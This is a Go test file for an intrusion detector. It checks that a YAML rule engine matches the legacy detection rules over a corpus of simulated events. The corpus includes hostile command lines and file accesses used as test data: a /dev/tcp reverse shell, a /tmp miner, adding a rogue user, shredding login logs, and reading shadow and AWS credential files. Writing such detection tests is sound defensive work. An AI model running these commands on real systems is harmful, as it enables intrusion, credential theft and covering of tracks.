package detector

import (
	"testing"

	"kernelwatch/internal/alerter"
	"kernelwatch/internal/collector"
	"kernelwatch/internal/config"
	"kernelwatch/internal/ruleengine"
)

// This test is the parity oracle for the YAML migration: it runs a broad event
// corpus through BOTH the legacy hardcoded rules and the compiled YAML engine
// (sharing the SAME real classifier) and asserts identical (rule id, severity)
// findings. The legacy rules in rules.go/rules_host.go are retained solely for
// this cross-check and can be removed once it has run green in CI for a while.

func legacyFindings(rules []Rule, e collector.Event, c *classifier) map[string]alerter.Severity {
	scope := scopeContainer
	if e.IsHost() {
		scope = scopeHost
	}
	out := map[string]alerter.Severity{}
	for i := range rules {
		r := &rules[i]
		if r.Scope&scope == 0 {
			continue
		}
		h := r.Match(e, c, scope)
		if h == nil {
			continue
		}
		sev := r.Severity
		if h.Severity != "" {
			sev = h.Severity
		}
		out[r.ID] = sev
	}
	return out
}

func engineFindings(eng *ruleengine.Engine, lp ruleengine.LineageProvider, e collector.Event) map[string]alerter.Severity {
	scope := ruleengine.ScopeContainer
	if e.IsHost() {
		scope = ruleengine.ScopeHost
	}
	out := map[string]alerter.Severity{}
	for _, r := range eng.Match(e, lp, scope) {
		out[r.RuleID] = r.Severity
	}
	return out
}

func TestEngineMatchesLegacyRules(t *testing.T) {
	cfg := &config.Config{Mode: "alert", AncestryDepth: 5, ServerName: "h"}
	class := newClassifier(cfg)
	lp := lineageAdapter{c: class}
	rules := defaultRules()
	eng, err := ruleengine.LoadDefault()
	if err != nil {
		t.Fatalf("LoadDefault: %v", err)
	}

	ce := func(path, cmd string, anc []string) collector.Event {
		return collector.Event{PID: 10, Type: collector.EventExecve, Filename: path, CmdLine: cmd, ProcessName: baseName(path), Ancestry: anc, Container: testContainer()}
	}
	he := func(path, cmd string, anc []string) collector.Event {
		return collector.Event{PID: 11, Type: collector.EventExecve, Filename: path, CmdLine: cmd, ProcessName: baseName(path), Ancestry: anc}
	}
	co := func(path string, flags uint64, comm string) collector.Event {
		return collector.Event{PID: 12, Type: collector.EventOpen, Filename: path, Arg1: flags, ProcessName: comm, Container: testContainer()}
	}
	ho := func(path string, flags uint64, comm string, anc []string) collector.Event {
		return collector.Event{PID: 13, Type: collector.EventOpen, Filename: path, Arg1: flags, ProcessName: comm, Ancestry: anc}
	}

	corpus := []collector.Event{
		// container execve, lineage spread
		ce("/bin/bash", "bash", []string{"nginx"}),
		ce("/bin/bash", "bash", []string{"cron"}),
		ce("/bin/bash", "bash", []string{"weird"}),
		ce("/usr/bin/curl", "curl http://x", []string{"php-fpm"}),
		ce("/usr/bin/curl", "curl http://x", []string{"cron"}),
		ce("/usr/bin/curl", "curl http://x", []string{"php"}),
		ce("/usr/bin/nmap", "nmap x", []string{"weird"}),
		ce("/usr/bin/apt", "apt install x", []string{"nginx"}),
		ce("/usr/bin/apt", "apt install x", []string{"cron"}),
		ce("/usr/bin/apt", "apt install x", []string{"weird"}),
		ce("/usr/bin/sudo", "sudo -i", []string{"nginx"}),
		ce("/usr/bin/sudo", "sudo -i", []string{"cron"}),
		ce("/usr/bin/sudo", "sudo -i", []string{"weird"}),
		ce("/tmp/.x/miner", "/tmp/.x/miner", []string{"sh"}),
		ce("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", []string{"cron"}),
		// container syscalls
		{PID: 1, Type: collector.EventPtrace, Arg1: 16, Arg2: 9, Container: testContainer()},
		{PID: 1, Type: collector.EventPtrace, Arg1: 0, Container: testContainer()},
		{PID: 1, Type: collector.EventModule, Container: testContainer()},
		{PID: 1, Type: collector.EventBPF, Arg1: 5, Container: testContainer()},
		{PID: 1, Type: collector.EventBPF, Arg1: 1, Container: testContainer()},
		// container opens
		co("/etc/cron.d/backdoor", 0x1|0x40, "python3"),
		co("/etc/ld.so.preload", 0x2, "python3"),
		co("/etc/crontab", 0, "cat"),
		co("/etc/shadow", 0, "cat"),
		co("/var/run/docker.sock", 0x2, "python3"),
		co("/root/.aws/credentials", 0, "cat"),
		// host execve
		he("/bin/bash", "bash", []string{"nginx"}),
		he("/bin/bash", "bash", []string{"sshd"}),
		he("/usr/bin/sudo", "sudo -i", []string{"sshd"}),
		he("/usr/bin/sudo", "sudo -i", []string{"nginx"}),
		he("/usr/bin/apt", "apt install x", []string{"sshd"}),
		he("/usr/bin/apt", "apt install x", []string{"nginx"}),
		he("/usr/sbin/useradd", "useradd evil", []string{"sshd"}),
		he("/usr/sbin/useradd", "useradd evil", []string{"nginx"}),
		he("/tmp/payload", "/tmp/payload", []string{"bash", "sshd"}),
		he("/tmp/cc/conftest", "cc", []string{"gcc", "dpkg"}),
		he("/run/helper", "/run/helper", []string{"systemd"}),
		he("/usr/bin/shred", "shred /var/log/wtmp", []string{"sshd"}),
		// host modules/bpf
		{PID: 2, Type: collector.EventModule, ProcessName: "systemd-udevd"},
		{PID: 2, Type: collector.EventModule, ProcessName: "insmod", Ancestry: []string{"bash", "sshd"}},
		{PID: 2, Type: collector.EventBPF, Arg1: 5, ProcessName: "dockerd"},
		// host opens
		ho("/etc/cron.d/x", 0x1|0x40, "python3", nil),
		ho("/etc/cron.d/x", 0x1|0x40, "dpkg", nil),
		ho("/home/u/.ssh/authorized_keys", 0x1|0x400, "sh", nil),
		ho("/etc/passwd", 0, "sshd", nil),
		ho("/etc/passwd", 0x1, "perl", nil),
		ho("/var/run/docker.sock", 0x2, "python3", nil),
		ho("/var/run/docker.sock", 0x2, "dockerd", nil),
		ho("/var/log/syslog", 0x1|0x200, "evil", nil),
		ho("/var/log/syslog", 0x1|0x400, "rsyslogd", nil),
	}

	for i, e := range corpus {
		want := legacyFindings(rules, e, class)
		got := engineFindings(eng, lp, e)
		if len(want) != len(got) {
			t.Fatalf("event %d (%s %s): rule-set differs\n legacy=%v\n engine=%v", i, e.TypeName(), e.Filename, want, got)
		}
		for id, sev := range want {
			if got[id] != sev {
				t.Fatalf("event %d (%s %s): rule %q severity legacy=%s engine=%s\n legacy=%v\n engine=%v",
					i, e.TypeName(), e.Filename, id, sev, got[id], want, got)
			}
		}
	}
}
